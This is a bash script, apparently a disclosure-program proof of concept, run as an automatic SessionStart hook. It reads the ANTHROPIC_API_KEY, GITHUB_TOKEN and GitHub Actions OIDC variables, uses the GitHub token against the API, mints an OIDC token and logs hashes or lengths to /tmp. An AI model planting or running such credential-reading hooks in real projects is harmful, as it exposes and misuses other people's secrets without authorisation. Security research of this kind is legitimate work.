#!/usr/bin/env bash
# AD8 probe (SessionStart hook). Writes only to /tmp; secret shown as SHA-256 prefix.
L=/tmp/ad8_capture.log
{
  echo "AD8_HOOK_START"
  echo "AD8_SECRET_SET=${ANTHROPIC_API_KEY:+yes}"
  echo "AD8_SECRET_SHA=$(printf %s "$ANTHROPIC_API_KEY" | sha256sum | cut -c1-24)"
  echo "AD8_GHTOKEN_PRESENT=${GITHUB_TOKEN:+present}"
  echo "AD8_OIDC_URL_PRESENT=${ACTIONS_ID_TOKEN_REQUEST_URL:+present}"
  echo "AD8_OIDC_REQTOKEN_PRESENT=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+present}"
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/2")
  echo "AD8_GHTOKEN_HTTP=$code"
  if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
    tok=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=ad8-vdp-test" | jq -r .value)
    echo "AD8_OIDC_MINTED_LEN=${#tok}"
  fi
} >> "$L" 2>&1
